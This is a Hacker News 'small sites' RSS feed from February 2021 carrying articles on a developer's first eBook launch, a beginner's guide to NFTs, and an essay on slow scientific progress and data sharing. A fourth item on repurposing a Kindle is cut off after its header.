<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Thu, 11 Feb 2021 12:39:47 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Thu, 11 Feb 2021 12:39:47 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Show HN: My first eBook – results and feedback]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26075471">thread link</a>) | @alexellisuk
<br/>
February 9, 2021 | https://blog.alexellis.io/my-first-ebook-results-feedback/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/my-first-ebook-results-feedback/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
   <article>

        

        <section>
            <div><p>I wanted to write to you all and share that I've launched my first eBook called <a href="https://gumroad.com/l/serverless-for-everyone-else">"Serverless For Everyone Else"</a> - within the first three hours of launch, nobody bought a single copy and I thought that I'd got it all wrong.</p>
<p>The "everyone else" is a reference to how complicated and difficult cloud-based and Kubernetes-based FaaS has become. The eBook sets out to help indie developers, and individuals within corporations build and deploy functions using a new version of OpenFaaS (<a href="https://github.com/openfaas/faasd">faasd</a>) which is open source and can run on a single VM or VPS without much overhead.</p>
<p>The real power of functions comes in extending existing systems through webhooks, polling, or querying and updating state. I'll share some of these use-cases below including how I used functions to extend how the Gumroad marketplace worked.</p>
<h2 id="whywriteanebookanyway">Why write an eBook anyway?</h2>
<p>Why did I decide to write an eBook? If you've ever written about tech or spoken at a conference, then Packt has probably approached you on LinkedIn about writing for them. From what I hear, that kind of arrangement means writing in a word doc, with tight deadlines and cranking out 300+ pages. It wasn't for me.</p>
<p>I'd seen <a href="https://twitter.com/dvassallo">Daniel Vassallo</a> create an eBook about AWS and Twitter. Daniel had really good results using Gumroad to sell his self-published eBooks. Then there's <a href="https://twitter.com/adamwathan">Adam Wathan</a> who built Tailwind CSS and trained himself up as a UI designer. He wrote his own eBook and in his yearly review mentioned that it did 600k USD in passive sales, without any promotion.</p>
<p>Whilst I didn't expect to get anywhere close to those numbers with a specialist topic, I did want to know if people would buy something from me.</p>
<h2 id="thetiersatlaunch">The tiers at launch</h2>
<p>I launched with three tiers, with names and clear differentiation:</p>
<ul>
<li>Minimalist - 25 USD - just the eBook</li>
<li>DevOps PRO - 50 USD - the eBook, plus a Grafana dashboard and the YAML for faasd to enable it</li>
<li>The learner - 99 USD - the eBook, plus a Grafana dashboard,  the YAML for faasd to enable it and a video workshop ready in 7 days</li>
<li>The team player - the learner, but for 5 people in your company</li>
</ul>
<p>As long as your options add some value, it seems that people enjoy the choice and are willing to pay a little more.</p>
<p>So I tweeted about the eBook and then nothing happened for three hours.</p>
<p>I interpreted this as a failure. I'd been reading <a href="https://amzn.to/38N5uZy">"The Right It: Why So Many Ideas Fail and How to Make Sure Yours Succeed"</a>, and had convinced myself that this was a sign that nobody wanted the material.</p>
<p>Then I got my first sale, and felt a little relief, maybe I was wrong?</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810538-27b57080-57ed-11eb-905b-d042d3046adf.png" alt="Sale email"></p>
<p>My sales graph had one initial spike on the Friday, and kept going into the Sunday. What had happened? My Twitter audience and GitHub Sponsors came to lend their support.</p>
<p><img src="https://pbs.twimg.com/media/ErzMnuOXMAA_REk?format=jpg&amp;name=medium" alt="Initial spike"></p>
<p>Then things died down, and over the course of the week I wondered if I'd failed to find market fit. <a href="https://gumroad.com/">Gumroad</a> was sending me almost no organic traffic, and nobody was landing on the page via SEO.</p>
<p>It was still more money than I had expected to earn from the eBook within the first week, but I felt like with so much interest in OpenFaaS, that there was a broader audience to reach.</p>
<h2 id="gettingasecondpeak">Getting a second peak</h2>
<p>After the first week, I released the video workshop to the people who'd purchased that tier (99USD), and to get some feedback, I offered a free upgrade to the workshop for the tier just below (50USD). That resulted in another large spike in interest.</p>
<p><img src="https://camo.githubusercontent.com/4e204e93dcfc33679c997c739fbf4f651fdf268d23961bae6f9b4c25ad4ec145/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f45735a3372753258634155513451673f666f726d61743d6a7067266e616d653d6d656469756d" alt="Video workshop"></p>
<p>How did I fulfil the upgrade / discount? I did it by writing a function and deploying it to my Raspberry Pi, so that Gumroad would send a webhook, my code would query the dollar amount, and then send out an email to the customer over AWS SES.</p>
<p><img src="https://pbs.twimg.com/media/EscxNxbXAAEHD8z?format=jpg&amp;name=large" alt="The function running"></p>
<p>Get the source code here: <a href="https://github.com/alexellis/gumroad-responder">alexellis/gumroad-responder</a></p>
<p>After the second peak, I saw a complete drop-off again - and started to wonder why?</p>
<p>99% of referrals came from Twitter and email, so had I exhausted my network?</p>
<p>I went ahead and added a link on openfaas.com and on my blog at the end of each post, to try and get more views on the eBook. It's too early to tell if that is going to work out, but has resulted in a few conversions already.</p>
<p>One of the bits of feedback I got on the eBook was how users enjoyed the use-cases, and practical examples. I'd recently started video streaming, so invited a friend to my YouTube channel to talk about serverless use-cases.</p>
<p><img src="https://camo.githubusercontent.com/544dffaf339a4ff44439db1c14cd953de385640b99231688f8a49db61294a02e/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f457378444745505841415968724c4f3f666f726d61743d6a7067266e616d653d6c61726765" alt="Video on use-cases"></p>
<p><a href="https://www.youtube.com/watch?v=mzuXVuccaqI&amp;feature=youtu.be">Watch the recording</a></p>
<p>The recording generated a lot of interest and engagement for existing eBook customers, but no additional sales.</p>
<p>You can get the <a href="https://gist.github.com/alexellis/c72d7a385f801cc9b8deb7fcaa531b69">show notes</a> here which have lots of links for use-cases from hobbyists, indie devs and corporate users of OpenFaaS.</p>
<h2 id="mynextmilestone">My next milestone</h2>
<p>I am pleased with the results so far, and have learned a lot along the way. I also had a few people reach out to me directly asking for help who had taken inspiration from seeing someone actually go ahead and take a calculated risk.</p>
<p>I haven't quite got to 10k USD, which is a nice round number to aim for, but I can roughly understand what each peak means here, and whether they are repeatable.</p>
<p><img src="https://pbs.twimg.com/media/EtARGclXMAg7nJ-?format=jpg&amp;name=medium" alt="Approaching 10k"></p>
<p>Once the sales do cross that threshold, I'll write-up a how to guide and share the command lines and tools I used to generate the eBook.</p>
<h2 id="whatsnext">What's next</h2>
<p>I committed to providing free updates - because the eBook was partially experimental and I wanted to validate that it was useful. Using the <a href="https://slack.openfaas.io/">OpenFaaS Slack</a> helped here - I opened a new channel for people who'd bought the book, and enjoyed the feedback and engagement from this.</p>
<p>Some people charge extra for community, but it felt too hard to enforce the access for this.</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810333-b628f280-57eb-11eb-8be9-a2f6c773346b.png" alt="Original cover"></p>
<p>I generated my own eBook cover originally and then only later, got a professional designer involved.</p>
<p><img src="https://static-2.gumroad.com/res/gumroad/2028406193591/asset_previews/741f2ad46ff0a08e16aaf48d21810ba7/retina/social4.png" alt="New design"></p>
<p>It turns out that the cover may not matter with Gumroad, as long as it's not awful. Since changing cover, I've only seen two new sales.</p>
<p>Now that I have some initial feedback and have learned that people will buy things from me, I want to let goodwill rebuild, and my audience "recover" before launching a second eBook. I've done a lot of free blog posts and writing on Kubernetes, Docker, Golang and Raspberry Pi and analytics from my blog shows me what's popular.</p>
<blockquote>
<p>In 14 days, I've received more money than OpenFaaS corporate users have paid into the project over 4 years.</p>
</blockquote>
<p>Just because something you give away for free is popular, doesn't mean that anyone will be willing to pay for it. OpenFaaS itself is testament to that, with many corporations using it in production, without contributing code or finances back.</p>
<p>The Right It has taught me not to invest too much effort up front in any one idea - as it's likely to fail. Instead I'll be testing ideas - getting feedback by investing a few hours or days, not weeks.</p>
<p>I am sure I've missed out lots of details here, so feel free to ask me questions.</p>
</div>
        </section>

        

    </article>
</div></div>]]>
            </description>
            <link>https://blog.alexellis.io/my-first-ebook-results-feedback/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26075471</guid>
            <pubDate>Tue, 09 Feb 2021 09:25:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner's Guide to NFTs]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26073970">thread link</a>) | @donohoe
<br/>
February 8, 2021 | https://linda.mirror.xyz/df649d61efb92c910464a4e74ae213c4cab150b9cbcc4b7fb6090fc77881a95d | <a href="https://web.archive.org/web/*/https://linda.mirror.xyz/df649d61efb92c910464a4e74ae213c4cab150b9cbcc4b7fb6090fc77881a95d">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h3>What are NFTs?</h3>
<p>Non-fungible token (NFT) is a term used to describe a unique digital asset whose ownership is tracked on a blockchain, such as Ethereum. Assets that can be represented as NFTs range from digital goods, such as items that exist within virtual worlds, to claims on physical assets such as clothing items or real estate. In the coming years, we will see NFTs used to unlock entirely new use cases that are only made possible by crypto.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/9799dae1-c2c9-4712-813b-10b23c279a36.jpeg" alt="Tokens redeemable for real world goods on Zora"></p><figcaption>Tokens redeemable for real world goods on Zora</figcaption></figure>
<p>While the Ethereum ecosystem is where most NFT activity has taken place to date, NFTs can exist on other smart contract platforms too. This is because, at their core, NFTs are just digital abstractions used to represent assets that are one of a kind. Non-fungible token isn’t the most intuitive term since we don’t commonly refer to the fungibility of objects in the physical world, but this is an important technical distinction when it comes to how an asset is represented on a blockchain. The goal for this post is not to detail every project within the NFT space, but to give a high level overview of what NFTs are, why they are interesting, and showcase some of their potential use cases.</p>
<h3>Why are NFTs interesting?</h3>
<p>NFTs are powerful because, when combined with other financial building blocks on Ethereum, they allow anyone to issue, own, and trade them. This makes interacting with NFTs significantly more efficient than in traditional platforms. The same reason why cryptocurrency used in payments is more efficient than traditional payments, that it is borderless and significantly easier to transfer, applies to NFTs. For example, if you want to create tradable in-game items as a game developer, then you can instantly have them be tradable through protocols that allow for decentralized exchange of NFTs. You don’t have to create your own marketplace or go through the onboarding process of a centralized platform in order to have the items be tradable.</p>
<p>NFT activity can go well past trading and include actions like being able to borrow and lend, support fractional ownership (e.g. <a href="https://www.niftex.com/">NIFTEX</a>), or use it as collateral in taking out a loan (e.g. <a href="https://nftfi.com/">NFTfi</a>). The possibilities are endless when you have the ability to combine NFTs with DeFi building blocks. For example, the game <a href="http://aavegotchi.com/">Aavegotchi</a> combines DeFi and NFT gaming where each Aavegotchi character represents a user’s collateral that is deposited within the lending platform <a href="https://aave.com/">Aave</a>, but you can also battle the characters, level them up, and equip wearables that change their traits.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/a1259686-6b61-455a-a204-f6e6da648f10.jpeg" alt="Aavegotchi gaming attributes change based on actions taken in DeFi"></p><figcaption>Aavegotchi gaming attributes change based on actions taken in DeFi</figcaption></figure>
<p>NFTs can cover an extremely wide variety of areas given they are simply digital representations of ownership but there has been significant growth within art and gaming in particular. Note that many digital works of art and gaming items are a subset of a larger category of NFT collectibles. There is also the emerging space of social tokens, which sometimes falls into the NFT category or that is closely related to it.</p>
<h3>Art</h3>
<p>NFTs can make fractionalized ownership more accessible, so if there is a valuable item that otherwise wouldn’t have been accessible for someone to own, now they can own a piece of it. Custody of a physical item still requires a trustworthy custodian, but being able to issue, hold, and trade it as a cryptoasset unlocks more use cases. One can also craft an NFT such that the creator receives a percentage of all secondary sales in a completely automated way. Artists typically don’t receive a cut of secondary sales in the traditional art world.</p>
<p>Programmable art is another interesting concept where a piece of artwork can incorporate on-chain data to dynamically update certain features or characteristics of the work. For example, one could create a piece of programmable art whose background changes if the price of ether goes above a certain dollar-value. There are countless creative possibilities.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/a51670c0-4a1c-4aaf-917d-0e551855b56d.jpeg" alt="Rutger van der Tas artwork that changes based on if it’s day or night"></p><figcaption>Rutger van der Tas artwork that changes based on if it’s day or night</figcaption></figure>
<p><a href="https://async.art/">Async Art</a> is a digital art marketplace known for programmable art. Many artists on Async sell artwork where someone is able to own the “master” copy which consists of a number of individual layers, but other people can own the individual layers and adjust their attributes over time. Imagine groups of people being able to own art collectively, where members of the group manage attributes of the work.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/fea07c75-8b3c-4592-b8f2-f5d6d92e544c.jpeg" alt="Osinachi artwork that includes a master and layers that can be individually adjusted"></p><figcaption>Osinachi artwork that includes a master and layers that can be individually adjusted</figcaption></figure>
<p>A common question about digital artwork is what can you do with it? These works can be displayed in digital frames in a physical setting for people to enjoy. The digital artist Beeple sold physical tokens along with his digital NFTs and made <a href="https://niftygateway.com/itemdetail/primary/0x6e5dc5405baefb8c0166bcc78d2692777f2cbffb/21">$3.5 million</a> from sales in an auction on the Nifty Gateway marketplace.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/8689be31-b33f-46ac-94aa-feea3a1b3dd1.jpeg" alt="Artist Beeple’s physical token that came with the NFT sale"></p><figcaption>Artist Beeple’s physical token that came with the NFT sale</figcaption></figure>
<p>Digital artwork can also be displayed in online collections like a <a href="https://superrare.co/thevault/collection">SuperRare profile</a> as well as in virtual worlds. There are a number of art galleries within <a href="http://cryptovoxels.com/">Cryptovoxels</a>, a virtual world where users can buy and sell land parcels as NFTs. As virtual reality spaces become more popular, having digital art to display will become more common. This wouldn’t be much different than someone spending money on video game items to customize a character’s appearance, already a multi-billion dollar industry.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/7386d358-d43d-4934-9ea5-b51c33932365.jpeg" alt="Digital art gallery in Cryptovoxels"></p><figcaption>Digital art gallery in Cryptovoxels</figcaption></figure>
<p>A common skepticism is that someone can just take a screenshot of the image or get a digital file so it’s not really scarce. However, the same argument could apply to physical items as well. Anyone can take a photo of the Mona Lisa or create a replica of it, but it isn’t the real item from the artist. People are willing to pay a premium for the original work. Another interesting aspect of digital art or collectibles is that you can easily verify the item’s ownership history. Some digital items might be worth more depending on who owned it in the past.</p>
<p>With NFTs, you can also prove that the item is real and tamper proof. This is an issue in the physical collectibles space. For example, a <a href="https://en.wikipedia.org/wiki/T206_Honus_Wagner">T206 Honus Wagner baseball card</a> was sold to Wayne Gretzky for $451k and sold again for several million dollars. One of the sellers of the card later admitted in court to trimming the card’s edges to make it look better. You can ensure NFT supply doesn’t change and there’s no counterfeit or continued printing. For example, there are many <a href="https://www.youtube.com/watch?v=AAvLC3fz068&amp;">counterfeit Black Lotus</a> cards in the popular game Magic: The Gathering. Common verification methods include bending the card to make sure it doesn’t crease or going through centralized grading services whose rating significantly affects the card's value.</p>
<h3>Gaming</h3>
<p>Steam, a popular video game platform, has a <a href="https://steamcommunity.com/market/?">Community Market</a> where in-game items can be bought and sold. Steam’s marketplace is centralized and collects a transaction fee of 5% for each item from the buyer. Games like Team Fortress 2 and Dota 2 take an additional fee of 10% for their items sold.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/4ad85fcf-b986-4b60-9fb5-925200fde3a9.jpeg" alt="Steam Community Market"></p><figcaption>Steam Community Market</figcaption></figure>
<p>Steam also restricts user wallet balances to $2,000 and the price of a single item to $1,800. While these cases are outliers, many in-game items can actually sell for significantly larger amounts such as the <a href="https://www.engadget.com/2013-11-06-dota-2-pink-war-dog-courier-sells-for-38-000.html">DotA 2 pink war dog courier</a> for $38,000. Within the crypto space there have also been high priced sales such as the $170,000 <a href="https://thenextweb.com/hardfork/2018/09/05/most-expensive-cryptokitty/">CryptoKitty</a>. Similarly Magic: The Gathering’s coveted <a href="https://www.polygon.com/2019/3/5/18251623/magic-the-gathering-black-lotus-auction-price">Black Lotus</a> card sold for $166,100. There is certainly demand for valuable in-game items. In decentralized marketplaces, there isn’t a limit imposed on what game items can be sold and for what amount.</p>
<p>Decentralized marketplaces can significantly reduce transaction fees due to the improved efficiency of starting up and operating a marketplace. Marketplaces can also improve overall user experience and increase interest in the game. Hearthstone is a wildly popular digital collectible card game created by Blizzard Entertainment that had over <a href="https://variety.com/2018/gaming/news/hearthstone-has-over-100-million-players-1203019919/">100 million players</a> in 2018. Hearthstone opted to not have a marketplace for their cards which leaves opportunity for other digital collectible card games that allow for an open marketplace. <a href="https://godsunchained.com/">Gods Unchained</a> and <a href="https://www.skyweaver.net/">SkyWeaver</a> are two trading card games (TCGs) that have cards that are freely tradable. You are also able to earn cards as you level up in the game. Players that did not purchase packs of cards will still be able to improve upon the game’s default decks. It’s an exciting feeling knowing that the earned cards have real world value and can be sold or traded for other cards. Gods Unchained also lets users earn tokens for when they win a match or refer their friend. The tokens themselves unlock rare in-game items and are also freely tradable.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/aa82c586-39b6-46b1-ae55-cb8a2e44c8e1.jpeg" alt="Gods Unchained"></p><figcaption>Gods Unchained</figcaption></figure>
<p>One of the most popular games in crypto is <a href="https://axieinfinity.com/">Axie Infinity</a>. You battle with a team of pet Axies and level them up. There's no aspect of the gameplay that feels like a blockchain game but there is the added benefit of being able to openly trade the Axies on NFT marketplaces such as <a href="https://opensea.io/">OpenSea</a>. The game has become popular in the <a href="https://www.coindesk.com/nft-game-filipinos-covid">Philippines</a> and earning tokens from the game has become a viable source of income for players even <a href="https://www.playtoearn.online/2020/07/08/axie-infinity-beats-minimum-wage-in-many-countries/">beating minimum wage</a> in many countries. There is also a decentralized autonomous organization (DAO) called <a href="https://yieldguild.io/">Yield Guild Games</a> which leases Axies to players that want to get started with the game but don’t have the funds to purchase them. Several rare Axies were even <a href="https://www.delphidigital.io/reports/why-we-spent-159k-on-digital-battle-pets-2/">purchased</a> for $159,000 total.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/26353bcc-0d05-47ea-89ac-fcdc9d2dd848.jpeg" alt="Axie Infinity battle"></p><figcaption>Axie Infinity battle</figcaption></figure>
<p>There’s another popular game <a href="https://zkga.me/">Dark Forest</a> where you can explore different planets and collect Artifact NFTs on new planets, which give bonuses when attached to the planet. Being able to discover and collect these items or even win them in a battle and then trade them in decentralized marketplaces can make the game even more fun.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/be66b61a-05f0-46b7-aa8f-f7ed542d5cd3.jpeg" alt="Planet in Dark Forest which has an Artifact NFT"></p><figcaption>Planet in Dark Forest which has an Artifact NFT</figcaption></figure>
<p>One concern with making in-game items tradable is that the ability to trade items can negatively affect the gameplay as people are focused on …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://linda.mirror.xyz/df649d61efb92c910464a4e74ae213c4cab150b9cbcc4b7fb6090fc77881a95d">https://linda.mirror.xyz/df649d61efb92c910464a4e74ae213c4cab150b9cbcc4b7fb6090fc77881a95d</a></em></p>]]>
            </description>
            <link>https://linda.mirror.xyz/df649d61efb92c910464a4e74ae213c4cab150b9cbcc4b7fb6090fc77881a95d</link>
            <guid isPermaLink="false">hacker-news-small-sites-26073970</guid>
            <pubDate>Tue, 09 Feb 2021 04:42:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The speed of science]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26073541">thread link</a>) | @salonium_
<br/>
February 8, 2021 | https://worksinprogress.co/issue/the-speed-of-science/ | <a href="https://web.archive.org/web/*/https://worksinprogress.co/issue/the-speed-of-science/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<div>
						<p>The 21st century has seen some phenomenal advances in our ability to make scientific discoveries. Scientists have developed <a href="https://www.nature.com/articles/nrd.2017.243">new technology</a> to build vaccines swiftly, <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">new algorithms</a> to predict the structure of proteins accurately, <a href="https://www.genome.gov/about-genomics/fact-sheets/DNA-Sequencing-Costs-Data">new equipment</a> to sequence DNA rapidly, and <a href="https://www.vox.com/platform/amp/energy-and-environment/2020/10/21/21515461/renewable-energy-geothermal-egs-ags-supercritical">new engineering solutions</a> to harvest energy efficiently. But in many fields of science, reliable knowledge and progress advance <a href="https://www.theatlantic.com/science/archive/2018/11/diminishing-returns-science/575665/">staggeringly</a> <a href="https://marginalrevolution.com/marginalrevolution/2019/11/is-the-rate-of-scientific-progress-slowing-down.html">slowly</a>. What slows it down? And what can we learn from individual fields of science to pick up the pace across the board – without compromising on quality?</p>
<p>By and large, scientific research is published in journals in the form of papers – static documents that do not update with new data or new methods. Instead of sharing the data and the code that produces their results, most scientists simply publish a textual description of their research in online publications. These publications are usually hidden behind paywalls, making it harder for outsiders to verify their authenticity.</p>
<p>On the occasion when a reader spots a discrepancy in the data or an error in the methods, they must read the intricate details of a study’s method scrupulously, and cross-check the statistics manually. When scientists don’t share the data to produce their results openly, the task becomes even harder. The process of error correction – from scientists publishing a paper, to readers spotting errors, to having the paper corrected or retracted – can take <a href="https://retractionwatch.com/2017/04/26/university-asked-numerous-retractions-eight-months-later-three-journals-done-nothing/">years</a>, assuming those errors are spotted at all.</p>
<p>When scientists reference previous research, they cite entire papers, not specific results or values from them. And although there is <a href="https://mattsclancy.substack.com/p/does-science-self-correct">evidence</a> that scientists hold back from citing papers once they have been retracted, the problem is compounded over time – consider, for example, a researcher who cites a study that itself derives its data or assumptions from prior research that has been disputed, corrected or retracted. The longer it takes to sift through the science, to identify which results are accurate, the longer it takes to gather an understanding of scientific knowledge.</p>
<p>What makes the problem even more challenging is that flaws in a study are not necessarily mathematical errors. In many situations, researchers make fairly arbitrary decisions as to how they collect their data, which methods they apply to analyse them, and which results they report – altogether leaving readers blind to the impact of these decisions on the results.</p>
<p>This murkiness can result in what is known as p-hacking: when researchers selectively apply arbitrary methods in order to achieve a particular result. For example, in a study that compares the well-being of overweight people to that of underweight people, researchers may find that certain cut-offs of weight (or certain subgroups in their sample) provide the result they’re looking for, while others don’t. And they may decide to only publish the particular methods that provided that result.</p>
<p>If a reader can’t find out how different versions of a study method have affected the results, how are they to know whether the finding really was robust – that it would be found regardless of how the data was looked at?</p>
<p>Now, it’s common to assume that these errors and flaws are largely smoothed out during the process of peer review, where peer scientists are asked to scrutinise a study and recommend to journal editors whether it should be revised or even published at all. But unfortunately peer review often fails to accomplish this, as the scientist Stuart Ritchie has described in his book <a href="https://us.macmillan.com/books/9781250222695"><i>Science Fictions</i></a>.</p>
<p>Substandard methods and questionable research practices are widespread even in published work. There is an enormous number of journals available, with different standards of publication, in which scientists can publish their work if they are rejected by some. And many lines of <a href="https://www.frontiersin.org/articles/10.3389/fnhum.2018.00037/full">evidence</a> suggest that ‘high impact’ journals (journals which are said to be highly reputable and have a wide reach) accept papers with similar or weaker methods than low-impact journals do.</p>
<p>Peer review instead functions predominantly as a practice of gatekeeping, as the philosophers of science Liam Bright and Remco Heesen have <a href="https://academic.oup.com/bjps/advance-article/doi/10.1093/bjps/axz029/5526887">explained</a>. Reviewers provide scientists with comments that are rarely made public. Whether research is published in a particular journal largely depends on the idiosyncratic decisions of reviewers who are available at the time and who are liked by the journal’s editors.</p>
<p>Peer review filters which research is published, with no use of transparent metrics for others to understand the reasoning behind these choices. The lack of transparency lends itself to misconduct – reviewers may discourage the publishing of science that challenges the prevailing consensus of the time or fails to replicate it – and hype, encouraging the publication of results that seem exciting over those that provide nuance.</p>
<p>These decisions have consequences, because journals are the dominant platform for sharing scientific research. When non-scientists, who want to apply scientific knowledge elsewhere, read research, they have little way of knowing which methods are sound and which results are reproducible or replicable.	<sup data-close="x" data-content="[1]">[1]</sup>
	<span>Reproducibility relates to whether the results can be reproduced using the same data and code as in the original analysis. Replicability relates to whether other scientists find similar results in their own studies.</span>
	 Other scientists can face the same problems, finding it difficult to assess the state of knowledge in a field, particularly if they have expertise in a different subject. This is troubling: the longer it takes to sift through the research to find out which results are reliable, the longer it takes to apply knowledge to solve new problems.</p>
<p>This view paints a bleak picture of the state of scientific knowledge, and the question that arises is: is all of science like this?</p>
<p>Fortunately, the answer is no. But unfortunately, many good practices are fairly modern and limited to specific domains. Here are some of them.</p>
<p>The remarkable <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">breakthrough</a> by DeepMind in 2020 – in accurately predicting the folded structure of proteins using only the code of protein sequences – was made possible because DeepMind’s AlphaFold algorithm was trained using data from <a href="https://www.rcsb.org/pages/about-us/index">Protein Data Bank</a>, a vast public database that dates back to 1971. Molecular scientists have been carefully applying difficult laboratory techniques to establish the structure of proteins and have manually submitted information about them to this database <a href="https://journals.iucr.org/a/issues/2008/01/00/sc5004/">for decades</a>. In parallel, data managers have been reviewing each of their submissions for accuracy. The platform now harbours over 150,000 curated entries of protein structures.</p>
<p>With databases like this, the benefits to other scientists are enormous: specifically, understanding the structure of proteins can help scientists design precise drugs that fit into them, as has been done for the <a href="https://cen.acs.org/analytical-chemistry/structural-biology/structural-biologists-revealed-new-coronaviruss/98/i17">spike protein</a> of the coronavirus. It can also help them understand why resistance to a drug has developed, such as in <a href="https://www.nature.com/scitable/topicpage/the-protein-data-bank-exploring-biomolecular-structure-14199109/">HIV research</a>. But more broadly, individual researchers no longer have to rediscover these protein structures over and over again if they have already been shared publicly, if they want to use that knowledge for other purposes.</p>
<p>The practice of sharing data is also the norm in the neighbouring field of genomics. The tradition largely stems from the <a href="https://en.wikipedia.org/wiki/Human_Genome_Project">Human Genome Project</a>, which began in 1990 and aimed to determine the entire code of the human genome. During the project, a group of scientists developed protocols called the <a href="https://www.annualreviews.org/doi/10.1146/annurev-genom-083115-022515">Bermuda Principles</a>, which recommended that labs working on the project should upload the details of any new genetic sequences that they discovered onto public data repositories on a daily basis.</p>
<p>Though the project was completed in 2003, the movement paved the way for data sharing principles in many genetic projects to come, such as the HapMap project, the 1000 Genomes project, dbGaP, and more recently, GISAID and NextStrain – two databases which publicly share genomes of the SARS-CoV-2 (Covid-19) virus.	<sup data-close="x" data-content="[2]">[2]</sup>
	<span>The HapMap project is a project that maps common genetic mutations of the human genome, while the 1000 Genomes project aims to develop a map of rare genetic mutations. dbGaP is a database of genetic mutations that are associated with medical traits and diseases.</span>
	 As with protein databases, these open sharing practices are remarkably important in genomics, in particular because they allow scientists to investigate a large number of genes and mutations at the same time, each detailed with a large amount of information that other scientists have collected.</p>
<p>These databases are immensely useful in sharing <i>data</i> for other researchers to analyse, but different tools are necessary for researchers to share the code used to <i>analyse data</i> – for example, if they want to test specific hypotheses. Some researchers voluntarily share their analysis code on <a href="https://en.wikipedia.org/wiki/Git">GitHub</a> and <a href="http://osf.io/">OSF</a>, two platforms where people can upload their data, code and research plans and update them when changes are made. But the practice of sharing code is not widely used by scientists even within these fields.</p>
<p>In computer science however, there are examples of journals that work with version control tools like Git. Take <a href="https://peerj.com/articles/cs-147/">JOSS</a> as an illustration, a journal that publishes research describing open source software. JOSS is actually built upon the platform of GitHub: software developers submit their software together with working papers describing them to the journal via GitHub, and the journal’s reviewers provide comments on their code and suggest revisions to their work publicly. Both reviewers’ comments and past versions of the software are therefore transparent and accessible to the public.</p>
<p>Apart from these examples of sharing data and code openly, some fields already commonly try to tackle p-hacking and other questionable research practices, described before. In economics, researchers typically perform “<a href="http://www.nickchk.com/robustness.html">robustness checks</a>” to demonstrate that their …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://worksinprogress.co/issue/the-speed-of-science/">https://worksinprogress.co/issue/the-speed-of-science/</a></em></p>]]>
            </description>
            <link>https://worksinprogress.co/issue/the-speed-of-science/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26073541</guid>
            <pubDate>Tue, 09 Feb 2021 03:43:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Turning an old Amazon Kindle into a eInk development platform]]>
            </title>
            <description>
<![CDATA[
Score 170 | Comments 21 (<a href="https://news.ycombinator.com/item?id=26073463">thread link</a>) | @miles
<br/>
February 8, 2021 | https://blog.lidskialf.net/2021/02/08/turning-an-old-kindle-into-a-eink-development-platform/ | <a href="https://web.archive.org/web/*/https://blog.lidskialf.net/2021/02/08/turning-an-old-kindle-into-a-eink-development-platform/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-1721">

	

	
			<figure>
